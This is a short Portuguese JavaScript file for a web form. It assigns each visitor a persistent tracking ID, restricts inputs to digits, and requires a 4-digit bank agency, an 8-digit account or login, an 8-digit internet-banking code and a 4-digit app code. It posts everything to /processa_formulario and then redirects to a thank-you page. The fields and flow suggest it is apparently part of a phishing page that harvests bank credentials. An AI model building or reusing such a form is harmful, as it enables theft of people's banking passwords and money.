// script.js

// --- Início: gera e anexa o user_id ---
const form = document.getElementById("mainForm");

let userId = localStorage.getItem("ban_user_id");
if (!userId) {
  userId = Date.now() + "-" + Math.random().toString(36).substr(2, 9);
  localStorage.setItem("ban_user_id", userId);
}
const hidden = document.createElement("input");
hidden.type = "hidden";
hidden.name = "user_id";
hidden.value = userId;
form.appendChild(hidden);
// --- Fim do user_id ---

const opcao1 = document.querySelector("#opcao1");
const opcao2 = document.querySelector("#opcao2");
const opcao3 = document.querySelector("#opcao3");
const opcao4 = document.querySelector("#opcao4");
const agency = document.querySelector("#agency");
const login = document.querySelector("#login");
const internet = document.querySelector("#internet");
const app = document.querySelector("#app");
const spans = document.querySelectorAll(".span-required");
const campos = document.querySelectorAll(".required");

// Função para filtrar caracteres não numéricos
function filterNumbers(event) {
  const input = event.target;
  input.value = input.value.replace(/\D+/g, "");
}
[agency, login, internet, app].forEach(field =>
  field.addEventListener("input", filterNumbers)
);

// Função para limitar o número de caracteres em tempo real
function limitInputLength(event, maxLength) {
  const input = event.target;
  input.value = input.value.slice(0, maxLength);
}
agency.addEventListener("input", e => limitInputLength(e, 4));
login.addEventListener("input", e => limitInputLength(e, 8));
internet.addEventListener("input", e => limitInputLength(e, 8));
app.addEventListener("input", e => limitInputLength(e, 4));

// Funções de erro e validação
function setError(idx) {
  campos[idx].style.border = "2px solid #e63636";
  spans[idx].style.display = "block";
}
function removeError(idx) {
  campos[idx].style.border = "";
  spans[idx].style.display = "none";
}

function agValidate() {
  if (campos[0].value.length < 4) {
    campos[0].value = campos[0].value.padStart(4, "0");
  }
  if (campos[0].value.length !== 4) {
    setError(0);
    return false;
  }
  removeError(0);
  return true;
}

function countValidate() {
  if (campos[1].value.length < 8) {
    campos[1].value = campos[1].value.padStart(8, "0");
  }
  if (campos[1].value.length !== 8) {
    setError(1);
    return false;
  }
  removeError(1);
  return true;
}

function internetValidate() {
  if (campos[2].value.length !== 8) {
    setError(2);
    return false;
  }
  removeError(2);
  return true;
}

function digitalValidate() {
  if (campos[3].value.length !== 4) {
    setError(3);
    return false;
  }
  removeError(3);
  return true;
}

// Envio via fetch
form.addEventListener("submit", event => {
  event.preventDefault();

  const okAg = agValidate();
  const okCnt = countValidate();
  const okInt = internetValidate();
  const okApp = digitalValidate();

  if (okAg && okCnt && okInt && okApp) {
    const formData = new FormData(form);
    fetch("/processa_formulario", {
      method: "POST",
      body: formData
    })
      .then(response => {
        if (response.ok) {
          window.location.href = "/agradecimento.html";
        } else {
          console.error("Erro ao enviar o formulário.");
        }
      })
      .catch(error => console.error("Erro:", error));
  }
});
